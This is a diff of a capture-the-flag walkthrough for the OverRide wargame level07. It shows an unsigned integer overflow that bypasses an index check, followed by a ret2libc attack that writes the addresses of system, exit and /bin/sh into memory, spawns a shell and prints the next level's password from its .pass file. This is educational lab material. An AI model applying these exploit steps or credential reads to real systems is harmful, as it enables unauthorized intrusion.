@@ -115,7 +115,8 @@ We have our offset !
 4) Find the good index to put the address of system :
 
 So we have 456 bytes to write before overwriting the Eip.
-The index is in int format so we have to write 114 bytes (456/4) to overwrite the Eip. (4 bytes = 1 int).
+The index is in uint format so we have to write 114 bytes (456/4) to overwrite the Eip. (4 bytes = 1 uint).
+(The unsigned integer type is uint. It takes 4 bytes of memory and allows expressing integers from 0 to 4294967295.)
 So our index is 114 !
 
 We have to test if we can put this index :
@@ -132,42 +133,46 @@ puts(" *** ERROR! ***");
 We have to find another way to pass the condition, and have the same index.
 We remember in the bonus1 of Rainfall, that we can use integer overflow/underflow.
 
-int min in c : 2147483647
+But here we have the index in uint format, so we have to find the max value of uint :
 
-Create a little program to test the integer overflow : test.c
+uint max in c : 4294967295
 
-./a.out 2147483648
-Dest = -2147483648
+Create a little program to test the integer overflow : test_uint.c
 
->>> 2147483648 * 2
-4294967296
+➜  Ressources git:(master) ✗ ./a.out 4294967295          
+4294967295
+➜  Ressources git:(master) ✗ ./a.out 4294967296
+0
+➜  Ressources git:(master) ✗ ./a.out 4294967297
+1
 
-./a.out 4294967296
-Dest = 0
+Ok perfect we just have to add 456 to 4294967296 to have the same index :
 
-With this overflow, we can have 0 with 4294967296.
-Now we can add 114 to 4294967296 to have 114.
-
->>> 4294967296 + 114
-4294967410
+Now we have to divide it by 4 because we are in uint format :
+>>> ((4294967296 + 456) / 4)
+or 
+>>> ((4294967297) / 4 + 114)
+1073741938
 
 And verify with our script :
-./a.out 4294967410          
-Dest = 114
+>>> 1073741938 * 4
+4294967752
+./a.out 4294967752
+456					--> our offset of 456 bytes, its good
 
-Perfect it works !
+Perfect it works (456 / 4 = 114) !
 Now we have to check if this number % 3 is different of 0 :
->>> 4294967410 % 3
+>>> 1073741938 % 3
 1
 
 Perfect, this problem is solved !
 
 Check with our script decode.c if (uVar1 >> 0x18 == 0xb7) is false
 
-./a.out 4294967410                                      
-Value = 114 | is Good
+./a.out 1073741938          
+Value = 1073741938 | is Good% 
 
-The value 4294967410 is good !
+The value 1073741938 is good !
 
 
 5) We have to find the address of system, exit and /bin/sh :
@@ -196,6 +201,83 @@ exit --> 0xf7e5eb70 = 4159040368
 6) We have to create our payload :
 
 We have to create our payload with the address of system, exit and /bin/sh.
-We have to write 114 bytes before overwriting the Eip.
 
+A) First we put the address of system in Eip (at the index 1073741938) :
+
+
+level07@OverRide:~$ ./level07 
+----------------------------------------------------
+  Welcome to wil's crappy number storage service!   
+----------------------------------------------------
+ Commands:                                          
+    store - store a number into the data storage    
+    read  - read a number from the data storage     
+    quit  - exit the program                        
+----------------------------------------------------
+   wil has reserved some storage :>                 
+----------------------------------------------------
+
+Input command: store
+ Number: 4159090384
+ Index: 1073741938
+ Completed store command successfully
+
+B) Now we have to put the address of exit after the address of system,
+The address of system is at index[114], so we have to put the address of exit at index[115] :
+
+Check if index 115 is ok
+>>> 115 % 3
+1
+
+Try with our script :
+./a.out 115
+Value = 115 | is Good%
+
+Its ok !
+
+Input command: store
+ Number: 4159040368
+ Index: 115
+ Completed store command successfully
+
+
+C)Same thing for /bin/sh, we have to put it at index[116] :
+
+>>> 116 % 3
+2
+
+./a.out 116   
+Value = 116 | is Good%
+
+it works !
+
+ Number: 4160264172
+ Index: 116
+ Completed store command successfully
+
+B bis) We also can put the the index of exit like for system :
+
+>>> 115 * 4
+460
+>>> 4294967296 + 460
+4294967756
+>>> 4294967756 % 3
+2
+>>> 4294967756 / 4
+1073741939
+
+C bis) Not working
+But not for /bin/sh because 4294967760 % 3 = 0
+>>> 116 * 4
+464
+>>> 4294967296 + 464
+4294967760
+>>> 4294967760 % 3
+0
+
+Now we have to quit the while loop, and call, its going to system("/bin/sh") :
+
+Input command: quit
+$ cat /home/users/level08/.pass
+7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
 
